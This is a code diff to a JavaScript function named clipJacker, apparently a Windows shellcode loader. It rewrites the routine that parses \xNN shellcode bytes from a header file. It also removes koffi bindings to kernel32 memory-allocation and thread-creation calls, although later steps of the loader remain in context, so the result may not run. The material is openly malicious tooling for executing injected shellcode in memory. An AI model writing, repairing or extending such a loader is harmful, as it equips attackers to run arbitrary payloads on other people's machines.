@@ -33,46 +33,25 @@ async function clipJacker(filePath) {
   }
 
   // 2. Parse shellcode from C header string
-  function parseShellcodeFromString(content) {
-    const matches = [...content.matchAll(/\\x([0-9a-fA-F]{2})/gi)];
-    
-    if (matches.length === 0) {
-      throw new Error('No \\xNN byte patterns found in the file');
+ function parseShellcodeFromString(content) {
+  const bytes = [];
+  let idx = 0;
+
+  while ((idx = content.indexOf('\\x', idx)) !== -1) {
+    const hex = content.slice(idx + 2, idx + 4);
+    if (hex.length !== 2 || isNaN(parseInt(hex, 16))) {
+      throw new Error(`Invalid hex byte near offset ${idx}`);
     }
-
-    const bytes = matches.map(m => parseInt(m[1], 16));
-    const buffer = Buffer.from(bytes);
-
-    log('INFO', 'Shellcode parsed', `${buffer.length} bytes`);
-
-    return buffer;
+    bytes.push(parseInt(hex, 16));
+    idx += 4;
   }
 
-  const shellcode = parseShellcodeFromString(rawContent);
-  const size = shellcode.length;
+  if (bytes.length === 0) {
+    throw new Error('No \\xNN shellcode bytes found');
+  }
 
-  const kernel32 = koffi.load('kernel32.dll');
-
-  const VirtualAlloc = kernel32.func(
-    'void * __stdcall VirtualAlloc(void * lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect)'
-  );
-
-  const VirtualProtect = kernel32.func(
-    'bool __stdcall VirtualProtect(void * lpAddress, size_t dwSize, uint32_t flNewProtect, uint32_t * lpflOldProtect)'
-  );
-
-  const RtlCopyMemory = kernel32.func(
-    'void __stdcall RtlCopyMemory(void * Destination, const void * Source, size_t Length)'
-  );
-
-  const CreateThread = kernel32.func(
-    'void * __stdcall CreateThread(void * lpThreadAttributes, size_t dwStackSize, void * lpStartAddress, void * lpParameter, uint32_t dwCreationFlags, uint32_t * lpThreadId)'
-  );
-
-  const WaitForSingleObject = kernel32.func(
-    'uint32_t __stdcall WaitForSingleObject(void * hHandle, uint32_t dwMilliseconds)'
-  );
-
+  return Buffer.from(bytes);
+}
 
 
   // 3. Allocate RW memory
@@ -134,6 +113,7 @@ if (args.length > 0) {
   });
 
 }
+
 
 
 
